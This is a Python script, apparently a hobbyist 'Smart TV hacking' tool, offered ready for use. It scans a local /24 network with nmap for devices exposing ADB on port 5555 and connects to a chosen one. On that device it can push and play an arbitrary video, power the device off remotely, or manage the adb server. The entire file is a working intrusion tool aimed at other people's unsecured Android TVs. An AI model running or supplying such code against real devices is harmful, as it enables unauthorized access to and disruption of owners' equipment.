import subprocess
import os
from colorama import Fore, Style, init
from pyfiglet import figlet_format
import sys

init(autoreset=True)

def execute_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return process.returncode, output.decode(), error.decode()

def execute_remote():
    print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Starting ADB server..")
    execute_command(["adb", "start-server"])

def scan_and_select_device():
    print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Scanning network for devices with open port 5555...")
    scan_code, scan_output, scan_error = execute_command(["nmap", "-p", "5555", "--open", "-oG", "-", "192.168.1.0/24"])

    if scan_code == 0 and scan_output:
        devices = [line.split()[1] for line in scan_output.split("\n") if "Host:" in line]
        if devices:
            print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Found {len(devices)} device(s) with port 5555 open.")
            for idx, device in enumerate(devices, 1):
                print(f"{Fore.YELLOW}{Style.BRIGHT} [+] {idx}.({device})")

            target_index = int(input(f"{Fore.YELLOW}{Style.BRIGHT} [*] Select the device number to connect: ")) - 1
            if 0 <= target_index < len(devices):
                return devices[target_index]
            else:
                print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Invalid selection.")
        else:
            print(f"{Fore.YELLOW}{Style.BRIGHT} [-] No devices found with port 5555 open.")
    else:
        print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error scanning the network.")
        print(f"{Fore.YELLOW}{Style.BRIGHT} [!] Nmap output: {scan_error.strip()}")

    return None

def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{figlet_format('  Smart TV Termux')}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}                                                   Created by Syntax")

    print(f"{Fore.YELLOW}{Style.BRIGHT}      SmartTV hacking screen for need port(5555) open!\n")
    print(f"{Fore.YELLOW}{Style.BRIGHT}      [1] Execute Local MP4 format")
    print(f"{Fore.YELLOW}{Style.BRIGHT}      [2] Power off TV")
    print(f"{Fore.YELLOW}{Style.BRIGHT}      [3] List devices")
    print(f"{Fore.YELLOW}{Style.BRIGHT}      [4] Kill devices")

    print(f"{Fore.YELLOW}{Style.BRIGHT}\n                      [99] Exit")
    print()

    selection = input(f"{Fore.YELLOW}{Style.BRIGHT} [*] selection: ")



    if selection == "1":
        targetip = scan_and_select_device()
        if targetip:
            connect_code, connect_output, connect_error = execute_command(["adb", "connect", targetip])
            if connect_code == 0 and "unable to connect" not in connect_output.lower() and "cannot connect to" not in connect_error.lower():
                print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Connecting..")
                print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Connected!")

                targetfile = input(f"{Fore.YELLOW}{Style.BRIGHT} [*] execute mp4 file: ")
                push_code, push_output, push_error = execute_command(["adb", "push", targetfile, "/storage/emulated/0/"])
                if push_code == 0:
                    targetfilename = os.path.basename(targetfile)
                    view_code, view_output, view_error = execute_command(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", f"file:///storage/emulated/0/{targetfilename}", "-t", "video/*"])
                    if view_code == 0:
                        print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Sent successfully!")
                    else:
                        print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error launching video viewer")
                        print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {view_error.strip()}")
                else:
                    print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error pushing file to device")
                    print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {push_error.strip()}")
            else:
                print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error connecting to the device, please make sure ADB is installed and the device is accessible")
                print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {connect_output.strip()} {connect_error.strip()}")



    elif selection == "2":
        targetip = scan_and_select_device()
        if targetip:
            connect_code, connect_output, connect_error = execute_command(["adb", "connect", targetip])
            if connect_code == 0 and "unable to connect" not in connect_output.lower() and "cannot connect to" not in connect_error.lower():
                print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Connection..")
                print(f"{Fore.YELLOW}{Style.BRIGHT} [+] connected!")
                power_off_code, power_off_output, power_off_error = execute_command(["adb", "shell", "reboot", "-p"])
                if power_off_code == 0:
                    print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Powering off!")
                else:
                    print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error powering off")
                    print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {power_off_error.strip()}")
            else:
                print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error connecting to the device, please make sure ADB is installed and the device is accessible")
                print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {connect_output.strip()} {connect_error.strip()}")



    elif selection == "3":
        print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Listing connected devices...")
        devices_code, devices_output, devices_error = execute_command(["adb", "devices"])
        if devices_code == 0:
            print(f"{Fore.YELLOW}{Style.BRIGHT} \n [+] {devices_output.strip()}")
        else:
            print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error listing devices")
            print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {devices_error.strip()}")



    elif selection == "4":
        print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Killing..")
        kill_code, kill_output, kill_error = execute_command(["adb", "kill-server"])

        if kill_code == 0:
            print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Devices killed!")
        else:
            print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Devices could not be killed!")
            print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {kill_output.strip()} {kill_error.strip()}")




    elif selection == "99":
        print(f"{Fore.YELLOW}{Style.BRIGHT}[!] Exiting..")
        sys.exit()

    else:
        print(f"{Fore.YELLOW}{Style.BRIGHT}[!] Invalid selection, exiting..")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}{Style.BRIGHT}\n[!] ctrl-c detected! exiting..")
        sys.exit()
